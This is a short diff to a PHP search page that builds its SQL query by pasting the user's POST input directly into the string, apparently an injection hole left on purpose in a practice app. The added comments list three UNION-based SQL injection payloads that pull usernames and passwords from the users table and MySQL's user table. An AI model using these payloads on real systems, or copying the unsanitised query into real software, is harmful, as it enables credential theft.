@@ -78,8 +78,11 @@
 					include "credentials/iss.php";
 					$var = $_POST["search"];
 					$counter=0;
-					// ' UNION SELECT id, username, password FROM users where 1; -- //
-					// ' UNION SELECT id, username, password FROM users where 1; -- '
+					/* 
+					' UNION SELECT id, username, password FROM users where 1 -- '
+					' UNION SELECT 1, User,Password FROM mysql.user -- ' 
+					' UNION SELECT user(), host, null FROM mysql.user; -- '
+					*/
 					$sql = "SELECT article, description, date FROM searcharea WHERE article LIKE '%$var%' or description LIKE '%$var%' or date LIKE '%$var%';";
 					
 					try {
